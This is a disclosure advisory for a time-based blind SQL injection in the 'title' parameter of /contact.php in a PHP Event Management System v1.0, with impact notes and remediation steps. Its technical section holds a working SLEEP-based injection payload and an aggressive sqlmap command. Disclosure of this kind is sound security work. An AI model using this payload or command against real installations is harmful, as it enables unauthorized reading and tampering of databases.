# **Press Release: SQL Injection in Event Management System (PHP) v1.0**

**Product Name**: Event Management System In PHP With Source Code  
**Affected File**: `/contact.php`  
**Discovered By**: T3rm1n4L  
**Version**: 1.0  


## **1. Executive Summary**

A critical SQL injection vulnerability has been identified in the **Event Management System In PHP With Source Code** (v1.0). Attackers can exploit the `title` parameter within `/contact.php` to inject malicious SQL code, potentially gaining full access to the underlying database. Immediate remediation is strongly advised.


## **2. Timeline of Discovery**

1. **Initial Observation**  
   - **Activity**: Security researcher T3rm1n4L noticed abnormal behavior when manipulating the `title` parameter on `/contact.php`.

2. **Technical Confirmation**  
   - **Activity**: Researcher used `sqlmap` and manual testing to confirm a time-based blind SQL injection flaw.

3. **Impact Assessment**  
   - **Activity**: Verified attacker’s ability to exfiltrate sensitive data, modify records, and cause service interruptions.

4. **Disclosure**  
   - **Activity**: Vulnerability communicated to relevant stakeholders for patch development.

5. **Public Advisory Release**  
   - **Activity**: Security bulletin and public report issued to raise awareness and provide mitigation steps.


## **3. Technical Details**

- **Vulnerability Type**: SQL Injection (Time-Based Blind)
- **Parameter**: `title` (POST)
- **Proof of Concept (PoC)**:

```bash
Parameter: title (POST)
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: title=111' AND (SELECT 6044 FROM (SELECT(SLEEP(5)))Utkc) AND 'otMP'='otMP&message=1111&submit=
```

**Example sqlmap Command**:
```bash
sqlmap -u "localhost:2309/contact.php" \
       --data="title=111&message=1111&submit=" \
       --batch --level=5 --risk=3 \
       --random-agent --tamper=space2comment
```

_Screenshot of successful injection testing:_

<img width="907" alt="image" src="https://github.com/user-attachments/assets/e0010adf-1591-4b65-abb2-c71a7f292f72" />



## **4. Root Cause & Impact**

### **Root Cause**  
Insufficient user input validation of the `title` parameter allows direct injection of malicious payloads into SQL queries.

### **Potential Consequences**  
- **Unauthorized Database Access**: Attackers may read or modify protected information.  
- **Data Leakage**: Sensitive records (e.g., customer info) can be exposed.  
- **Data Tampering**: Malicious actors can create, update, or delete records.  
- **Operational Disruption**: System downtime or service interruption.


## **5. Remediation Steps**

1. **Implement Prepared Statements & Parameter Binding**  
   - Ensure separation of SQL logic and user inputs to prevent injection.

2. **Strengthen Input Validation**  
   - Enforce whitelist or strict validation on fields like `title`, rejecting suspicious characters.

3. **Apply Least Privilege**  
   - Restrict database user privileges, limiting the potential impact if a compromise occurs.

4. **Schedule Regular Security Assessments**  
   - Periodic code reviews and penetration tests to detect and address vulnerabilities promptly.


## **6. Additional Information**

- **Vendor Homepage**: [Event Management System In PHP](https://codezips.com/php/event-management-system-in-php-with-source-code/#google_vignette)  
- **Download Source**: [GitHub ZIP](https://codeload.github.com/codezips/event-management-system-php/zip/master)  
- **Disclosure Policy**: This advisory follows responsible disclosure guidelines, providing details to stakeholders prior to public release.


## **7. Disclaimer**

The contents of this press release are solely for informational purposes to aid in remediating the vulnerability. Unauthorized attempts to exploit the described vulnerability may violate applicable laws. All stakeholders are urged to patch immediately and adopt secure coding practices.
